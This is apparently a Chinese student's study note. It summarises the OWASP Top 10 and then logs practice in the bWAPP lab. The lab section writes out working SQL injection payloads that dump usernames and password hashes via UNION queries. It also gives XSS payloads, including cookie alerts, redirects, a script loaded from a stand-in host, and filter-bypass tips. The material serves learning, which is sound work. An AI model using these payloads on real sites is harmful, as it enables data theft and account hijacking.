# 常见的web漏洞总结



***OWASP 的web漏洞top 10***

1. 注入

   > 在设计程序，忽略了对输入字符串中夹带的SQL指令的检查，被数据库误认为是正常的SQL指令而运行，从而使数据库受到攻击，可能导致数据被窃取、更改、删除

2. 失效的身份认证

   > 将恶意的未经身份验证的攻击者与授权用户进行分离。

   有多种原因造成身份验证方面的危险

   + 允许密码填充
   + 允许暴力破解
   + 允许弱密码
   + 使用明文、加密、弱散列密码

3. 敏感数据暴露

   > Web 应用和 API无法正确保护敏感信息

4. XML External Entities(XXE)

   > xml的解析器的不安全使用

5. 无效控制访问

   > 未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数据

6. 安全配置错误

   >  不安全的默认配置、不完整的临时配置、开源云存储、错误的 HTTP 标头配置以及包含敏感信息的详细错误信息所造成的

7. Cross-SiteScripting (XSS) 跨站脚本攻击

   >  网站未对用户上传字段进行检查，使攻击者可以上传恶意的代码，从而窃取用户的cookie等数据

8. 不安全的反序列化

   > 不安全的反序列化会导致远程代码执行。即使反序列化缺陷不会导致远程代码执行，攻击者也可以利用它们来执行攻击，包括：重播攻击、注入攻击和特权升级攻击。

9. 使用含有已知漏洞的组件

   > 组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限。如果应用程序中含有已知漏洞的组件被攻击者利用，可能会造成严重的数据丢失或服务器接管。同时，使用含有已知漏洞的组件的应用程序和API可能会破坏应用程序防御、造成各种攻击并产生严重影响。

10. 不足的记录&监控

    > 不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性或转向更多系统，以及篡改、提取或销毁数据。

***



***靶场的练习***

​	在bwapp练习了一下手工注入，然后学习了骆佬发的B站教程，对sql数据库的结构有了更清晰的认识，对`database` `table` `colunm` 理解有了一定的加深，还学习了一些基础的数据库查询语句，以下记录一下手动注入(写报告的时候靶场好像关了)

injection的低等级漏洞，__search(GET)__的漏洞

1. 输入` 'or 1=1 #`得到所有回显

2. 试了试 union 联合注入，得到报错好像是列数不匹配,然后试出来2，3，5，7有回显`' and 1=2 union select 1,2,3,4,5,6,7 #`

3. 用user() database()函数看了看信息，用户是root`' and 1=2 union select 1,user(),3,database(),6,7 #`

4. 从information_schema库中获取表名users`' and 1=2 union select 1,2,3,table_schema,6,7 from  information_schema.tables #`

5. 获取列名login password

6. 最后payload为`' and 1=2 union select 1,login,3,4,password,6,7 from users #`

   得到了用户名和md5加密的密码

然后在8003端口试了试XSS，也是从教程视频中学到一些基础的概念，比如反射性漏洞和储存型漏洞，再比如如何手动构造XSS脚本，还有些基础知识

html标签

```
<iframe>	#创建包含另一个文档的内联框架
<textarea>	#标签定义多行的文本输入控件
<img>	#向网页嵌入一幅图像
<script> #定义客户端脚本，比如JavaScript
					既可包含脚本语句，也可以通过src指向外部脚本文件
					JavaScript的常应用于图像操作、表单验证、动态内容更新
```

js语句
```
alert
window.location
location.href
onload
onsubmit
onerror
```
1. 弹出窗口
```html
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
```
2. 页面嵌套
```html
<iframe src=http://www.example.com width=300 height=300></iframe>
```
3. 重新定向
```html
<script>alert("move to new site");location.href="http://www.baidu.com"</script>
```
4. 恶意代码
```html
<script src="http://www.cheat.com"></script>
```
5. 利用图片
`<img src="http://baidu.com"></img>`
6. 绕开过滤的方法：大小写混用、base64 url编码

最后还学习了一下自动化工具beef的使用




